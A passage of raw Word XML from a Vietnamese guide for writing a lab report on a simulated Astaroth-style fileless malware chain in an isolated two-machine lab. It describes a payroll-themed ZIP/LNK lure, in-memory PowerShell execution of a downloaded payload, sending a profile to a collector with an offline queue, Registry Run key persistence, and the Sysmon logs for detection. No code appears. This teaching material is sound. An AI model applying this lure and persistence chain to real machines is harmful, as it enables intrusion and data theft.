        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh kịch bản mất mạng: file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ảnh kịch bản có mạng lại: queued profile được gửi sang attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh Sysmon Event ID 1 cho </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh Sysmon Event ID 3 cho kết nối đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh Sysmon Event ID 3 cho kết nối đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> khi collector online.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ảnh PowerShell Event ID 4104.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh kiểm tra không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Không cần chụp:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>certutil -decode</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Persistence nguy hiểm hoặc ẩn mình.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Calculator.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Các mục đó thuộc bản lab cũ.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cách viết Chương 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1. Mục tiêu lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể viết:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360" w:right="216"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục tiêu của bài lab là mô phỏng an toàn một chuỗi Astaroth-inspired Fileless Malware trên hai máy. Máy attacker host trang HR giả, file ZIP mồi nhử và payload vô hại, trong khi máy victim tải ZIP, giải nén shortcut LNK và mở shortcut. Shortcut gọi PowerShell để tải nội dung </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> từ attacker qua HTTP port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, tạo ScriptBlock trong bộ nhớ và thực thi trực tiếp. Payload sau đó thu thập thông tin máy không nhạy cảm, gửi JSON profile về attacker qua </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">. Nếu kênh collector bị mất nhưng payload server vẫn truy cập được, profile được lưu tạm vào </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để mô phỏng offline staging; khi collector hoạt động lại, payload gửi queue về attacker. Lab cũng tạo Registry Run key vô hại để mô phỏng persistence và retry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2. Môi trường lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lập bảng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Thành phần              Mô tả</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Attacker                Windows thật, IP 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Victim                  Windows VM, IP 192.168.141.140</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Python static server    Host ZIP và payload.ps1 trên port 8000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Python collector server Nhận POST /collect trên port 8001</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Sysmon                  Ghi log process, network, file create</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>PowerShell Logging      Ghi script block Event ID 4104</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer            Đọc và export log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3. Kịch bản mô phỏng</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Viết theo từng bước:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Tạo payload vô hại </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Tạo shortcut </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> gọi PowerShell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nén shortcut thành </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Attacker host ZIP/payload bằng Python static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và chạy collector port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Victim tải ZIP từ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://192.168.141.1:8000/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Victim giải nén ZIP và mở shortcut.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">PowerShell trên victim tải nội dung </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> qua HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nội dung payload được tạo thành ScriptBlock và thực thi trong memory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload thu thập thông tin máy không nhạy cảm.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload gửi JSON profile về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu không có mạng, payload lưu profile vào </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Khi mạng quay lại, payload gửi queue về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Payload tạo Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để mô phỏng persistence và retry.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Thu thập log Sysmon, PowerShell 4104, Security 4688 và Registry event nếu Sysmon config có bật.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.4. Phân tích kết quả</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Có thể viết:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360" w:right="216"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả lab cho thấy một payload có thể được tải qua mạng và thực thi bởi PowerShell mà không cần lưu thành file payload rõ ràng trên ổ đĩa của victim. Trên attacker, static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> ghi nhận request tải </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, còn collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
